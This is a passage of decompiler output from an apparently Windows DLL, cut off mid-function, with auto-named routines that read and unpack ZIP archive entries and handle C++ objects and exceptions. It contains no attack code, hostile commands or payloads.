void *__thiscall sub_10024D04(_DWORD *this)
{
  *this = &off_1010309C;
  return sub_10024B53(this + 1);
}
// 1010309C: using guessed type int (__thiscall *off_1010309C)(void *Block, char);

//----- (10024D30) --------------------------------------------------------
int __thiscall sub_10024D30(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (10024D3C) --------------------------------------------------------
int __thiscall sub_10024D3C(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 12))(this + 1);
}

//----- (10024D48) --------------------------------------------------------
int __thiscall sub_10024D48(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, a2);
  return a2;
}

//----- (10024D7E) --------------------------------------------------------
int __thiscall sub_10024D7E(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 36))(this + 1, a2);
  return a2;
}

//----- (10024DB4) --------------------------------------------------------
_DWORD *__thiscall sub_10024DB4(_DWORD *Block, char a2)
{
  sub_10024B53(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10024DD3) --------------------------------------------------------
_DWORD *__thiscall sub_10024DD3(_DWORD *Block, char a2)
{
  sub_10024D04(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10024DF2) --------------------------------------------------------
_DWORD *__stdcall sub_10024DF2(_DWORD *a1)
{
  sub_1001BAF3(a1);
  sub_10024E48((int)a1);
  return a1;
}

//----- (10024E24) --------------------------------------------------------
void *__stdcall sub_10024E24(_DWORD *a1)
{
  return sub_1001BB30(a1);
}

//----- (10024E48) --------------------------------------------------------
void *__usercall sub_10024E48@<eax>(int a1@<esi>)
{
  _DWORD *v1; // eax
  _DWORD v3[5]; // [esp+4h] [ebp-20h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  v1 = sub_10020F2E(v3);
  v4 = 0;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)a1 + 56))(a1, v1);
  v4 = -1;
  return sub_1001BB30(v3);
}
// 10024E48: using guessed type _DWORD var_20[5];

//----- (10024E99) --------------------------------------------------------
int __stdcall sub_10024E99(int a1, int a2, int a3)
{
  *(_DWORD *)a1 = &off_10103020;
  *(_BYTE *)(a1 + 4) = 1;
  sub_1000D372((_DWORD *)(a1 + 8), a2);
  sub_1000D372((_DWORD *)(a1 + 16), a3);
  *(_DWORD *)(a1 + 24) = 0;
  sub_1000D17D((_DWORD *)(a1 + 28), &word_10178DB8);
  return a1;
}
// 10103020: using guessed type int (__thiscall *off_10103020)(void *Block, char);

//----- (10024EF8) --------------------------------------------------------
bool __userpurge sub_10024EF8@<al>(int a1@<esi>, unsigned __int8 *a2)
{
  int v3; // eax
  char v4; // bl
  bool v5; // zf
  _DWORD *v6; // eax
  int v7[2]; // [esp+8h] [ebp-1Ch] BYREF
  int v8; // [esp+10h] [ebp-14h]
  int v9; // [esp+14h] [ebp-10h]
  int v10; // [esp+20h] [ebp-4h]

  v9 = 0;
  if ( !*(_DWORD *)(a1 + 24) )
    return 1;
  v3 = sub_10023120(a2);
  v4 = 1;
  v5 = *(_DWORD *)(a1 + 24) == 1;
  v8 = v3;
  if ( !v5 || v3 != 1 || (v6 = sub_1002307A(a2, v7), v10 = 0, v9 = 1, sub_1000D65C((int)v6, a1 + 28)) )
    v4 = 0;
  v10 = -1;
  if ( (v9 & 1) != 0 )
  {
    v9 &= ~1u;
    sub_1000D3AD(v7);
  }
  return v4 || *(_DWORD *)(a1 + 24) == 4 && v8 == 4 && *(_DWORD *)(a1 + 36) == sub_10022FE1(a2);
}

//----- (10024F94) --------------------------------------------------------
bool __thiscall sub_10024F94(void *this)
{
  unsigned __int8 *v2; // eax
  bool v4; // [esp+Eh] [ebp-42h]
  bool v5; // [esp+Fh] [ebp-41h] BYREF
  int v6[2]; // [esp+10h] [ebp-40h] BYREF
  int v7[4]; // [esp+18h] [ebp-38h] BYREF
  int v8[7]; // [esp+28h] [ebp-28h] BYREF
  int v9; // [esp+4Ch] [ebp-4h]

  sub_1001C041((int)&v5);
  v4 = 1;
  if ( !sub_10020A7A((int *)dword_1017E02C, (int)this + 8) )
    return 0;
  sub_10020A26((int)v7, (int)this + 8);
  v9 = 0;
  sub_1000D17D(v6, &word_10178DBC);
  LOBYTE(v9) = 1;
  v5 = sub_1000D65C((int)v6, (int)this + 16) != 0;
  LOBYTE(v9) = 0;
  sub_1000D3AD(v6);
  if ( v5 )
  {
    if ( sub_10021625((unsigned __int8 *)v7, (int)this + 16) )
    {
      v2 = (unsigned __int8 *)sub_1002168B((char *)v7, (int)v8, (int)this + 16);
      LOBYTE(v9) = 2;
      v4 = sub_10024EF8((int)this, v2);
      LOBYTE(v9) = 0;
      sub_100511C9(v8);
    }
    else
    {
      v4 = 0;
    }
  }
  v9 = -1;
  sub_100215F9(v7);
  return v4;
}
// 1017E02C: using guessed type int dword_1017E02C;
// 10024F94: using guessed type int var_38[4];
// 10024F94: using guessed type int var_28[7];

//----- (10025092) --------------------------------------------------------
int __thiscall sub_10025092(_BYTE *this)
{
  int result; // eax
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  v3[3] = v3;
  v3[6] = 0;
  LOBYTE(result) = sub_10024F94(this);
  if ( this[4] )
    return (unsigned __int8)result;
  else
    return (_BYTE)result == 0;
}

//----- (100250DF) --------------------------------------------------------
_DWORD *__stdcall sub_100250DF(_DWORD *a1, int a2, volatile LONG *lpAddend)
{
  int v3; // eax
  int v5; // [esp-8h] [ebp-24h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-20h]
  void *v7; // [esp+8h] [ebp-14h]
  void *Block; // [esp+Ch] [ebp-10h]
  int v9; // [esp+18h] [ebp-4h]

  v9 = 1;
  Block = operator new(0x14u);
  if ( Block )
  {
    v7 = &v5;
    v6 = lpAddend;
    v5 = a2;
    InterlockedIncrement(lpAddend);
    LOBYTE(v9) = 1;
    v3 = sub_10011942((int)Block, v5, v6);
  }
  else
  {
    v3 = 0;
  }
  LOBYTE(v9) = 0;
  sub_10050B91(a1, v3);
  LOBYTE(v9) = 3;
  a1[2] = *a1;
  sub_10023D8F(a1 + 4);
  LOBYTE(v9) = 4;
  sub_1000D17D(a1 + 8, &word_10178DB0);
  LOBYTE(v9) = 5;
  a1[14] = -1;
  a1[15] = 0;
  sub_10025267((int)a1);
  sub_100253D3((int)a1, 0x12Cu);
  v9 = -1;
  sub_10020B81(&a2);
  return a1;
}

//----- (1002519E) --------------------------------------------------------
unsigned int __usercall sub_1002519E@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // ecx
  unsigned int v3; // edi
  unsigned int v4; // eax
  int v5; // ebx
  int v6; // eax
  int v7; // edx
  int v8; // eax
  int v9; // edx
  int v11[5]; // [esp+8h] [ebp-28h] BYREF
  unsigned int v12; // [esp+1Ch] [ebp-14h]
  int v13; // [esp+20h] [ebp-10h]
  int v14; // [esp+2Ch] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  v2 = *(_DWORD *)(a1 + 8);
  v13 = v1;
  v3 = 0;
  (*(void (__thiscall **)(int, _DWORD, int))(*(_DWORD *)v2 + 8))(v2, 0, 2);
  v4 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  v5 = 0xFFFF;
  v12 = v4;
  if ( v4 < 0xFFFF )
    v5 = v4;
  (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(a1 + 8) + 8))(*(_DWORD *)(a1 + 8), -v5, 2);
  sub_1000B1F3((void *)v5, (int)v11, 0);
  v14 = 0;
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 8) + 20))(*(_DWORD *)(a1 + 8), v11);
  (*(void (__thiscall **)(_DWORD, int, _DWORD))(**(_DWORD **)(a1 + 8) + 8))(*(_DWORD *)(a1 + 8), v13, 0);
  if ( v5 != 22 )
  {
    while ( 1 )
    {
      v6 = sub_1000B4B8(v11);
      if ( *(_DWORD *)(v6 + v7) == 101010256 )
        break;
      if ( v7 == 1 )
        goto LABEL_9;
    }
    v8 = sub_1000B4B8(v11);
    if ( *(unsigned __int16 *)(v9 + v8 + 20) + v9 + 22 == v5 )
      v3 = v12 + v9 - v5;
  }
LABEL_9:
  v14 = -1;
  sub_1000B3DF(v11);
  return v3;
}
// 1002521E: variable 'v7' is possibly undefined
// 10025234: variable 'v9' is possibly undefined
// 1002519E: using guessed type int var_28[5];

//----- (10025267) --------------------------------------------------------
void __thiscall sub_10025267(int this)
{
  int v2; // eax
  int v3; // edi
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7[5]; // [esp+Ch] [ebp-44h] BYREF
  int v8[5]; // [esp+20h] [ebp-30h] BYREF
  int v9[2]; // [esp+34h] [ebp-1Ch] BYREF
  unsigned int v10; // [esp+3Ch] [ebp-14h] BYREF
  int v11; // [esp+4Ch] [ebp-4h]

  (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 8) + 8))(*(_DWORD *)(this + 8), -22, 2);
  v10 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 8) + 4))(*(_DWORD *)(this + 8));
  sub_1000B1F3((void *)0x16, (int)v8, 0);
  v11 = 0;
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 8) + 20))(*(_DWORD *)(this + 8), v8);
  v2 = sub_1000B4B8(v8);
  v3 = v2;
  if ( *(_WORD *)(v2 + 20) || *(_DWORD *)v2 != 101010256 )
  {
    v4 = sub_1002519E(this);
    v10 = v4;
    if ( !v4 )
    {
      v5 = sub_1002539B(&v10);
      LOBYTE(v11) = 1;
      sub_10025A05((int)v5);
    }
    (*(void (__thiscall **)(_DWORD, unsigned int, _DWORD))(**(_DWORD **)(this + 8) + 8))(*(_DWORD *)(this + 8), v4, 0);
    (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 8) + 20))(*(_DWORD *)(this + 8), v8);
    v3 = sub_1000B4B8(v8);
    sub_1000B1F3((void *)*(unsigned __int16 *)(v3 + 20), (int)v7, 0);
    LOBYTE(v11) = 2;
    (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 8) + 20))(*(_DWORD *)(this + 8), v7);
    v6 = sub_1000D2FA(v9, 1u);
    LOBYTE(v11) = 3;
    sub_10001236(v6 + 1, (LONG *)(this + 36));
    LOBYTE(v11) = 2;
    sub_1000D3AD(v9);
    LOBYTE(v11) = 0;
    sub_1000B3DF(v7);
  }
  *(_DWORD *)(this + 40) = *(unsigned __int16 *)(v3 + 10);
  *(_DWORD *)(this + 48) = v10 - *(_DWORD *)(v3 + 12) - *(_DWORD *)(v3 + 16);
  *(_DWORD *)(this + 44) = *(_DWORD *)(v3 + 16);
  *(_DWORD *)(this + 52) = *(_DWORD *)(v3 + 12);
  v11 = -1;
  sub_1000B3DF(v8);
}
// 10025267: using guessed type int var_30[5];
// 10025267: using guessed type int var_44[5];

//----- (1002539B) --------------------------------------------------------
_DWORD *__stdcall sub_1002539B(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_10102420;
  return a1;
}
// 10102420: using guessed type int (__thiscall *off_10102420)(void *Block, char);

//----- (100253D3) --------------------------------------------------------
int __userpurge sub_100253D3@<eax>(int a1@<eax>, unsigned int a2)
{
  bool v3; // zf
  int v4; // ecx
  int v5; // eax
  int result; // eax
  unsigned int v7; // esi
  int v8; // ebx
  unsigned int i; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)(a1 + 16) + 52))(a1 + 16);
  v3 = *(_DWORD *)(a1 + 56) == 0;
  *(_DWORD *)(a1 + 12) = a2;
  if ( v3 )
  {
    v5 = *(_DWORD *)(a1 + 60);
  }
  else
  {
    v4 = *(_DWORD *)(a1 + 44);
    v5 = v4 + *(_DWORD *)(a1 + 48);
    *(_DWORD *)(a1 + 56) = 0;
    *(_DWORD *)(a1 + 60) = v4;
  }
  (*(void (__thiscall **)(_DWORD, int, _DWORD))(**(_DWORD **)(a1 + 8) + 8))(*(_DWORD *)(a1 + 8), v5, 0);
  result = *(_DWORD *)(a1 + 56);
  v7 = *(_DWORD *)(a1 + 60) - *(_DWORD *)(a1 + 44);
  for ( i = result; v7 < *(_DWORD *)(a1 + 52); ++i )
  {
    result = a2;
    if ( i >= a2 )
      break;
    v10 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    sub_1002546C((int *)a1);
    v8 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_DWORD *)(a1 + 60) = result;
    v7 += v8 - v10;
    ++*(_DWORD *)(a1 + 56);
  }
  return result;
}

//----- (1002546C) --------------------------------------------------------
void __usercall sub_1002546C(int *a1@<edi>)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int *v3; // esi
  void *v4[4]; // [esp+4h] [ebp-1Ch] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v1 = operator new(0x24u);
  v4[2] = v1;
  v5 = 0;
  if ( v1 )
    v2 = sub_100265EA(v1, a1[2]);
  else
    v2 = 0;
  v5 = -1;
  sub_10050B91(v4, (int)v2);
  v5 = 1;
  v3 = a1 + 4;
  if ( (*(int (__thiscall **)(int *))(a1[4] + 4))(a1 + 4) >= (unsigned int)a1[3] )
    (*(void (__thiscall **)(int *, _DWORD))(*v3 + 40))(a1 + 4, 0);
  (*(void (__thiscall **)(int *, void **))(*v3 + 36))(a1 + 4, v4);
  v5 = -1;
  sub_1002415C(v4);
}

//----- (100254EB) --------------------------------------------------------
_DWORD *__userpurge sub_100254EB@<eax>(int a1@<ebx>, _DWORD *a2)
{
  sub_100253D3(a1, 0xFFFFFFFF);
  *a2 = off_100FBF5C;
  *a2 = &off_10103028;
  a2[1] = 0;
  a2[2] = 0;
  a2[3] = 0;
  sub_10021F96(a1 + 16, (int)a2);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103028: using guessed type int (__thiscall *off_10103028)(void *Block, char);

//----- (1002554A) --------------------------------------------------------
int __thiscall sub_1002554A(int this, _DWORD *a2, unsigned int a3, _DWORD *a4, int a5)
{
  unsigned int v6; // ecx
  int v7; // esi
  _DWORD *v9; // eax
  int v10; // eax
  _DWORD *v11; // eax
  void *v12; // ebx
  int v13; // edi
  int v14; // eax
  _DWORD *v15; // ebx
  LONG *v16; // eax
  _DWORD *v17; // eax
  char v18[32]; // [esp+Ch] [ebp-84h] BYREF
  int v19[5]; // [esp+2Ch] [ebp-64h] BYREF
  int v20[5]; // [esp+40h] [ebp-50h] BYREF
  int v21[5]; // [esp+54h] [ebp-3Ch] BYREF
  int v22[5]; // [esp+68h] [ebp-28h] BYREF
  int v23; // [esp+7Ch] [ebp-14h]
  int v24; // [esp+8Ch] [ebp-4h]

  v24 = 0;
  v6 = a4[8];
  if ( !v6 )
  {
    v7 = 0;
LABEL_3:
    v24 = -1;
    sub_1002415C((void **)&a4);
    return v7;
  }
  if ( a3 >= v6 )
  {
    v9 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v24) = 1;
    sub_10007882((int)v9);
  }
  (*(void (__thiscall **)(_DWORD, int, _DWORD))(**(_DWORD **)(this + 8) + 8))(
    *(_DWORD *)(this + 8),
    *a4 + *(_DWORD *)(this + 48),
    0);
  sub_1000B1F3((void *)0x1E, (int)v22, 0);
  LOBYTE(v24) = 2;
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 8) + 12))(*(_DWORD *)(this + 8), v22);
  v10 = sub_1000B4B8(v22);
  if ( *(_DWORD *)v10 != 67324752 )
  {
    v11 = sub_1002539B(&a2);
    LOBYTE(v24) = 3;
    sub_10025A05((int)v11);
  }
  v12 = (void *)(*(unsigned __int16 *)(v10 + 26) + *(unsigned __int16 *)(v10 + 28));
  v13 = (int)v12 + v22[3];
  if ( !a2[3] )
  {
    v7 = a4[8] + v13;
    LOBYTE(v24) = 0;
    sub_1000B3DF(v22);
    goto LABEL_3;
  }
  sub_1000B1F3(v12, (int)v20, 0);
  LOBYTE(v24) = 4;
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 8) + 20))(*(_DWORD *)(this + 8), v20);
  v14 = a4[8];
  v15 = a2;
  if ( (unsigned int)(v14 + v13) >= a2[3] )
    v23 = a2[3];
  else
    v23 = v13 + v14;
  (*(void (__thiscall **)(_DWORD, unsigned int, int))(**(_DWORD **)(this + 8) + 8))(*(_DWORD *)(this + 8), a3, 1);
  sub_1000B6B7(v15, (int)v21, v13, v23 - v13);
  LOBYTE(v24) = 5;
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(this + 8) + 20))(*(_DWORD *)(this + 8), v21);
  v16 = (LONG *)sub_1000B6B7(a2, (int)v19, 0, v13);
  LOBYTE(v24) = 6;
  sub_1000B3BD(v16, (int)v21);
  LOBYTE(v24) = 5;
  sub_1000B3DF(v19);
  v17 = (_DWORD *)sub_1000B63D(v22, (int)v19, v20);
  LOBYTE(v24) = 7;
  sub_1001AEB1(v17, (int)v18);
  LOBYTE(v24) = 9;
  sub_1000B3DF(v19);
  sub_10011746(v18, v21);
  LOBYTE(v24) = 5;
  sub_1001AF12((int)v18);
  LOBYTE(v24) = 4;
  sub_1000B3DF(v21);
  LOBYTE(v24) = 2;
  sub_1000B3DF(v20);
  LOBYTE(v24) = 0;
  sub_1000B3DF(v22);
  v24 = -1;
  sub_1002415C((void **)&a4);
  return v23;
}
// 1002554A: using guessed type int var_50[5];
// 1002554A: using guessed type int var_3C[5];
// 1002554A: using guessed type int var_64[5];

//----- (10025748) --------------------------------------------------------
void *__stdcall sub_10025748(int a1, void *a2, unsigned int a3, _DWORD *a4, volatile LONG *lpAddend)
{
  volatile LONG *v5; // edi
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  _DWORD **v8; // ebx
  unsigned int v9; // eax
  int v10; // ecx
  int v11; // eax
  _DWORD *v12; // eax
  unsigned int v13; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  LONG *v17; // eax
  LONG *v18; // eax
  _DWORD *v19; // [esp-8h] [ebp-114h] BYREF
  int v20; // [esp-4h] [ebp-110h]
  int v21; // [esp+0h] [ebp-10Ch] BYREF
  _DWORD v22[18]; // [esp+Ch] [ebp-100h] BYREF
  int v23[5]; // [esp+54h] [ebp-B8h] BYREF
  int v24[5]; // [esp+68h] [ebp-A4h] BYREF
  int v25[5]; // [esp+7Ch] [ebp-90h] BYREF
  int v26[8]; // [esp+90h] [ebp-7Ch] BYREF
  int v27[6]; // [esp+B0h] [ebp-5Ch] BYREF
  int v28[5]; // [esp+C8h] [ebp-44h] BYREF
  int v29[5]; // [esp+DCh] [ebp-30h] BYREF
  _DWORD **v30; // [esp+F0h] [ebp-1Ch]
  int v31; // [esp+F4h] [ebp-18h]
  int v32; // [esp+F8h] [ebp-14h]
  int *v33; // [esp+FCh] [ebp-10h]
  int v34; // [esp+108h] [ebp-4h]

  v33 = &v21;
  v32 = 0;
  v34 = 1;
  v30 = &v19;
  v5 = lpAddend;
  v20 = (int)lpAddend;
  v6 = a4;
  v19 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v34) = 2;
  v7 = (_DWORD *)sub_1000B1F3(0, (int)v24, 0);
  LOBYTE(v34) = 4;
  v8 = (_DWORD **)sub_1002554A(a1, v7, 0, v19, v20);
  v30 = v8;
  LOBYTE(v34) = 1;
  sub_1000B3DF(v24);
  sub_1000B1F3(v8, (int)v29, 0);
  LOBYTE(v34) = 5;
  v9 = v6[7];
  v31 = a3;
  if ( a3 >= v9 )
    v31 = v9;
  sub_1000B1F3((void *)4, (int)v27, 0);
  LOBYTE(v34) = 6;
  sub_1000B79B(v10, v27);
  v27[5] = (int)&v19;
  v20 = (int)v5;
  v19 = a4;
  InterlockedIncrement(v5);
  LOBYTE(v34) = 6;
  v11 = sub_1002554A(a1, v29, 0, v19, v20);
  if ( v30 != (_DWORD **)v11 )
  {
    v12 = sub_1002539B(&a3);
    LOBYTE(v34) = 8;
    v20 = 318;
    sub_10025A05((int)v12);
  }
  qmemcpy(v26, (const void *)sub_1000B4B8(v29), 0x1Eu);
  sub_1000B67C(v29, (int)v28, HIWORD(v26[6]) + LOWORD(v26[7]) + 30, v29[3] - (HIWORD(v26[6]) + LOWORD(v26[7]) + 30));
  LOBYTE(v34) = 9;
  v13 = a4[8];
  if ( a4[7] == v13 )
  {
    if ( a3 < v13 )
      v13 = a3;
    sub_1000B67C(v28, (int)a2, 0, v13);
    v32 = 1;
  }
  else
  {
    v15 = (_DWORD *)sub_1000B1F3((void *)2, (int)&v26[2], &unk_101022A0);
    LOBYTE(v34) = 10;
    v16 = (_DWORD *)sub_1000B63D(v15, (int)v23, v28);
    LOBYTE(v34) = 11;
    v17 = (LONG *)sub_1000B63D(v16, (int)v24, v27);
    LOBYTE(v34) = 12;
    sub_1000B3BD(v17, (int)v28);
    LOBYTE(v34) = 11;
    sub_1000B3DF(v24);
    LOBYTE(v34) = 10;
    sub_1000B3DF(v23);
    LOBYTE(v34) = 9;
    sub_1000B3DF(&v26[2]);
    sub_1000B1F3(0, (int)v25, 0);
    LOBYTE(v34) = 14;
    sub_100260E5(0, (int)v22);
    LOBYTE(v34) = 15;
    v18 = (LONG *)sub_1002646F(v22, &v26[2], v28);
    LOBYTE(v34) = 16;
    sub_1000B3BD(v18, (int)v25);
    LOBYTE(v34) = 15;
    sub_1000B3DF(&v26[2]);
    LOBYTE(v34) = 14;
    sub_1002612E(v22);
    v34 = 13;
    sub_1000B67C(v25, (int)a2, 0, v31);
    v32 = 1;
    LOBYTE(v34) = 9;
    sub_1000B3DF(v25);
  }
  LOBYTE(v34) = 6;
  sub_1000B3DF(v28);
  LOBYTE(v34) = 5;
  sub_1000B3DF(v27);
  LOBYTE(v34) = 1;
  sub_1000B3DF(v29);
  LOBYTE(v34) = 0;
  sub_1002415C((void **)&a4);
  return a2;
}
// 100257F0: variable 'v10' is possibly undefined
// 10025748: using guessed type int var_A4[5];
// 10025748: using guessed type int var_44[5];
// 10025748: using guessed type int var_B8[5];
// 10025748: using guessed type int var_90[5];
// 10025748: using guessed type _DWORD var_100[18];

//----- (10025A05) --------------------------------------------------------
void __cdecl __noreturn sub_10025A05(int pExceptionObject)
{
  sub_10052153(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVEqsMbhajmjho_rce_sr__);
}

//----- (10025A25) --------------------------------------------------------
_DWORD *__thiscall sub_10025A25(_DWORD *Block, char a2)
{
  *Block = &off_1010311C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1010311C: using guessed type int (__thiscall *off_1010311C)(void *Block, char);

//----- (10025A4C) --------------------------------------------------------
int __thiscall sub_10025A4C(int this, int a2)
{
  int result; // eax

  result = this;
  if ( this != a2 )
  {
    *(_DWORD *)(this + 4) = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(this + 8) = *(_DWORD *)(a2 + 8);
    *(_BYTE *)(this + 12) = *(_BYTE *)(a2 + 12);
    *(_DWORD *)(this + 16) = *(_DWORD *)(a2 + 16);
    *(_DWORD *)(this + 20) = *(_DWORD *)(a2 + 20);
    *(_BYTE *)(this + 24) = *(_BYTE *)(a2 + 24);
  }
  return result;
}

//----- (10025A80) --------------------------------------------------------
int __thiscall sub_10025A80(_DWORD *this)
{
  return this[5];
}

//----- (10025A84) --------------------------------------------------------
char __thiscall sub_10025A84(_BYTE *this)
{
  return this[24];
}

//----- (10025A88) --------------------------------------------------------
int __thiscall sub_10025A88(_BYTE *this)
{
  return this[12] & 1;
}

//----- (10025A90) --------------------------------------------------------
_DWORD *__thiscall sub_10025A90(int this, _DWORD *a2)
{
  DWORD v3; // ecx
  _DWORD *v4; // eax
  char *v5; // ebx
  DWORD v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // eax
  _DWORD *v12; // eax
  void **v13; // eax
  _DWORD *v14; // eax
  int v16; // [esp-8h] [ebp-5Ch] BYREF
  DWORD CurrentProcessId; // [esp-4h] [ebp-58h]
  int v18[5]; // [esp+Ch] [ebp-48h] BYREF
  int v19[3]; // [esp+20h] [ebp-34h] BYREF
  int v20; // [esp+2Ch] [ebp-28h]
  int v21; // [esp+34h] [ebp-20h]
  int v22; // [esp+38h] [ebp-1Ch] BYREF
  int *pExceptionObject; // [esp+3Ch] [ebp-18h] BYREF
  int v24; // [esp+40h] [ebp-14h] BYREF
  int v25; // [esp+44h] [ebp-10h] BYREF
  int v26; // [esp+50h] [ebp-4h]

  v21 = 0;
  sub_1000B1F3((void *)0x400, (int)v19, 0);
  v26 = 1;
  if ( (*(_DWORD *)(this + 20) & 0x100000) != 0 )
  {
    v4 = sub_1001F992(&v25);
    LOBYTE(v26) = 2;
    sub_1000EE19(&pExceptionObject, (int)v4);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__);
  }
  CurrentProcessId = v3;
  v16 = v3;
  pExceptionObject = &v16;
  sub_1000D372(&v16, (int)&unk_10186A60);
  LOBYTE(v26) = 1;
  v5 = sub_1001E665((int)&unk_10186A58);
  CurrentProcessId = GetCurrentProcessId();
  v6 = GetCurrentProcessId();
  sub_10011AF4((int)&v22, *(void **)(this + 4), 1, *(_DWORD *)(this + 8), v6, CurrentProcessId);
  LOBYTE(v26) = 4;
  CurrentProcessId = 0;
  v16 = v20;
  v8 = sub_1000B49B(v19, v7);
  if ( ((int (__stdcall *)(int *, int, int, int, DWORD))v5)(pExceptionObject, 2, v8, v16, CurrentProcessId) < 0 )
  {
    CurrentProcessId = 0;
    v16 = v20;
    v10 = sub_1000B49B(v19, v9);
    v11 = ((int (__cdecl *)(int *, int, int))v5)(pExceptionObject, 2, v10);
    v12 = sub_10050D97(&v24, v11);
    LOBYTE(v26) = 5;
    sub_10015338((int)v12, 130);
  }
  v13 = (void **)sub_1000B4B8(v19);
  v14 = (_DWORD *)sub_1000B1F3((void *)*(unsigned __int16 *)v13, (int)v18, v13[1]);
  LOBYTE(v26) = 6;
  sub_1000D230(v14, a2);
  v21 = 1;
  LOBYTE(v26) = 4;
  sub_1000B3DF(v18);
  LOBYTE(v26) = 1;
  sub_1000A159(&v22);
  LOBYTE(v26) = 0;
  sub_1000B3DF(v19);
  return a2;
}
// 10025AF1: variable 'v3' is possibly undefined
// 10025B42: variable 'v7' is possibly undefined
// 10025B5B: variable 'v9' is possibly undefined
// 10025A90: using guessed type int var_34[3];
// 10025A90: using guessed type int var_48[5];

//----- (10025BE5) --------------------------------------------------------
_DWORD *__thiscall sub_10025BE5(int this, _DWORD *a2)
{
  DWORD v3; // ecx
  _DWORD *v4; // eax
  DWORD v5; // eax
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  _DWORD *v11; // eax
  void **v12; // eax
  _DWORD *v13; // eax
  int v15; // [esp-8h] [ebp-60h] BYREF
  DWORD CurrentProcessId; // [esp-4h] [ebp-5Ch]
  int v17[5]; // [esp+Ch] [ebp-4Ch] BYREF
  int v18[3]; // [esp+20h] [ebp-38h] BYREF
  int v19; // [esp+2Ch] [ebp-2Ch]
  int v20; // [esp+34h] [ebp-24h] BYREF
  int v21; // [esp+3Ch] [ebp-1Ch]
  int v22; // [esp+40h] [ebp-18h] BYREF
  int *pExceptionObject; // [esp+44h] [ebp-14h] BYREF
  char *v24; // [esp+48h] [ebp-10h] BYREF
  int v25; // [esp+54h] [ebp-4h]

  v21 = 0;
  sub_1000B1F3((void *)0x400, (int)v18, 0);
  v25 = 1;
  if ( (*(_DWORD *)(this + 20) & 0x100000) != 0 )
  {
    v4 = sub_1001F992(&v24);
    LOBYTE(v25) = 2;
    sub_1000EE19(&pExceptionObject, (int)v4);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__);
  }
  CurrentProcessId = v3;
  v15 = v3;
  pExceptionObject = &v15;
  sub_1000D372(&v15, (int)&unk_10186A60);
  LOBYTE(v25) = 1;
  v24 = sub_1001E665((int)&unk_10186A58);
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  sub_10011AF4((int)&v22, *(void **)(this + 4), 1, *(_DWORD *)(this + 8), v5, CurrentProcessId);
  LOBYTE(v25) = 4;
  CurrentProcessId = 0;
  v15 = v19;
  v7 = sub_1000B49B(v18, v6);
  if ( ((int (__stdcall *)(int *, int, int, int, DWORD))v24)(pExceptionObject, 1, v7, v15, CurrentProcessId) < 0 )
  {
    CurrentProcessId = 0;
    v15 = v19;
    v9 = sub_1000B49B(v18, v8);
    v10 = ((int (__cdecl *)(int *, int, int))v24)(pExceptionObject, 1, v9);
    v11 = sub_10050D97(&v20, v10);
    LOBYTE(v25) = 5;
    sub_10015338((int)v11, 156);
  }
  v12 = (void **)sub_1000B4B8(v18);
  v13 = (_DWORD *)sub_1000B1F3((void *)*(unsigned __int16 *)v12, (int)v17, v12[1]);
  LOBYTE(v25) = 6;
  sub_1000D230(v13, a2);
  v21 = 1;
